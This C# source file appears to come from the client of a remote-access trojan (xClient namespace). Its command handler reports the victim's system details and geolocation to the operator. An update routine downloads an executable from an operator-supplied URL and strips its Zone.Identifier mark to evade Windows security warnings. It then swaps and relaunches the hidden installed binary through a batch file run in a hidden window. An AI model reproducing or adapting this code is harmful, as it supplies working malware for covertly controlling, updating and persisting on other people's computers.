using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using xClient.Config;

namespace xClient.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE CONNECTION. */
    public static partial class CommandHandler
    {
        public static void HandleInitializeCommand(Packets.ServerPackets.InitializeCommand command, Client client)
        {
            SystemCore.InitializeGeoIp();
            new Packets.ClientPackets.Initialize(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
                SystemCore.Country, SystemCore.CountryCode, SystemCore.Region, SystemCore.City, SystemCore.ImageIndex,
                SystemCore.GetId()).Execute(client);
        }

        public static void HandleUpdate(Packets.ServerPackets.Update command, Client client)
        {
            // i dont like this updating... if anyone has a better idea feel free to edit it
            new Packets.ClientPackets.Status("Downloading file...").Execute(client);

            new Thread(() =>
            {
                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    Helper.Helper.GetRandomFilename(12, ".exe"));

                try
                {
                    using (WebClient c = new WebClient())
                    {
                        c.Proxy = null;
                        c.DownloadFile(command.DownloadURL, tempFile);
                    }
                }
                catch
                {
                    new Packets.ClientPackets.Status("Download failed!").Execute(client);
                    return;
                }

                new Packets.ClientPackets.Status("Downloaded File!").Execute(client);

                new Packets.ClientPackets.Status("Updating...").Execute(client);

                try
                {
                    DeleteFile(tempFile + ":Zone.Identifier");

                    var bytes = File.ReadAllBytes(tempFile);
                    if (bytes[0] != 'M' && bytes[1] != 'Z')
                        throw new Exception("no pe file");

                    string filename = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        Helper.Helper.GetRandomFilename(12, ".bat"));

                    string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
                        ? "@echo off" + "\n" +
                          "echo DONT CLOSE THIS WINDOW!" + "\n" +
                          "ping -n 20 localhost > nul" + "\n" +
                          "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "del " + "\"" + filename + "\""
                        : "@echo off" + "\n" +
                          "echo DONT CLOSE THIS WINDOW!" + "\n" +
                          "ping -n 20 localhost > nul" + "\n" +
                          "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "move " + "\"" + tempFile + "\"" + " " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "start \"\" " + "\"" + SystemCore.MyPath + "\"" + "\n" +
                          "del " + "\"" + filename + "\""
                        ;

                    File.WriteAllText(filename, uninstallBatch);
                    ProcessStartInfo startInfo = new ProcessStartInfo();
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                    startInfo.UseShellExecute = true;
                    startInfo.FileName = filename;
                    Process.Start(startInfo);

                    SystemCore.Disconnect = true;
                    client.Disconnect();
                }
                catch
                {
                    DeleteFile(tempFile);
                    new Packets.ClientPackets.Status("Update failed!").Execute(client);
                    return;
                }
            }).Start();
        }
    }
}